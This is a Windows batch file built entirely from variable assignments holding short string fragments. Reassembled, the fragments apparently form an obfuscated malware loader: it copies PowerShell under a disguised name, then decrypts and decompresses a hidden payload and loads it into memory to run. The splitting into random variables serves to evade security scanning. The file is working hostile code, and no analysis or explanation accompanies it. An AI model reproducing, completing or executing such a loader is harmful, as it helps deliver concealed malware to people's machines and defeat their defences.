@echo off
set "RRrqAPRIfM=Sy"
set "KMQsyWnhsT=1."
set "CdLkHXPnVe=do"
set "LVRSDRtwEr=.e"
set "BaiCewcKWW=ow"
set "nYQCemqJmG=ll"
set "sBMrqFQbzz= C"
set "MWeADNPDcm=in"
set "UgPOMBIvCg=we"
set "qTzaFyyRKu=ws"
set "WWsumXImEr=rs"
set "eVmaBJJSbo=32"
set "FtFkdTxCta=\W"
set "kJildVuMwa=py"
set "xptvZYgPpa= /"
set "DwKZCmGRjR=xe"
set "QKuWihQLxN=Po"
set "PFCLPtoxIn=we"
set "ebpMYrcHce=co"
set "RTucZZtzfA=0\"
set "QcoEqGdemq=\v"
set "oXSIwSJPbA=he"
set "SecOnnmNXU=em"
set "GZZYGrLfiK=y "
set "aTdtHVOZKj=Wi"
set "OMQRomIorP=po"
set "geQhjkeKne=ll"
set "nDYLBYWYem=he"
set "aNGyohZJOo=:\"
set "VLYhayytKv=s\"
set "ZlVXtCoXvs=nd"
set "ScnwNZLBok=st"
set "djHpKSxeVe=rS"
set "PIjCfRWjwk= %~dp0"
set "QbhmAWJLVu=cd"
set "QfipHgqGSq=HjiV"
set "UPrrGeRvrZ=cd ="
set "ritcdLhILB=tsWi"
set "mVZdxlHIje=DT.T"
set "UNwwNPzphN=]::N"
set "unLHvnGSmv=ke($"
set "LvAYGQVuEV=HjiV"
set "UtgtnyKoSt=lBlo"
set "wIOYqjghyh=::De"
set "nTucTllogE=sion"
set "KRKtqzMtsA=Comp"
set "evSRwIOGyJ=RmAx"
set "ikTQQRvXEc=ovMG"
set "xTIHyGeBGd=porE"
set "PGUPEajeuh=)) {"
set "TiPCmcNlCP=eam("
set "VyRopUKNhM=iron"
set "jdhnZLLtYY=ode]"
set "ZmJARWZNre=e]::"
set "IukGSmhBUP=SlVc"
set "orHJBIjfvN=HjiV"
set "nwetqwmyzO=tem."
set "CngcWIJJNc=ddin"
set "TPJlEcxice=morF"
set "eEIvyImyuE=m.Re"
set "yKCxOcbBdi=$THj"
set "OdTxOeUOSl=yste"
set "IUhYSPYeGa=Qzcd"
set "ECkOzsjBDd=.GZi"
set "uclEnGYTtC=PKCS"
set "jfPVIaKwSx=BC;$"
set "tFioQMGnAj=ionM"
set "ENFFpGgfVt=);$T"
set "kPjsghmPtI=7;$T"
set "chyyhUGTKJ=oArr"
set "ccnAcEdXJd=nage"
set "ZRmjSZAZmg=.Cre"
set "kaJLktrAnJ=jQzc"
set "JleZbCbpyA=d = "
set "IGiyNHEgtz=3); "
set "hnsgJOabxb=ateD"
set "LxYvSQaFNV=stem"
set "rxvQkfFDfA=l5E7"
set "GzPtYGPTLU=BgxR"
set "UCwTGZIkVe=-joi"
set "cZJuoWiwky=:('g"
set "nHTExlBNTW=rans"
set "yLhIdZvVUQ=js, "
set "aXsAdNZiDV=zHhH"
set "iYnKGWPcko=;$EX"
set "rGqOoqaGnJ=cBgx"
set "SDManxZzEH=ay()"
set "fpCyOHZxbz=F'[-"
set "qVmLditNPi=nirt"
set "BxXFdQECui=yste"
set "VyIqDGxlDQ=join"
set "PMyZmsRsLN=ment"
set "PUXDUDUbCD=jQzc"
set "FWxbHNPUVl=embl"
set "vqMWCbFwuR=in $"
set "wYXCBvOeCC=YxVw"
set "nptVuwSFxJ=ispo"
set "KSNzWwvxgH=ose("
set "YOPUOOlmds=d;$T"
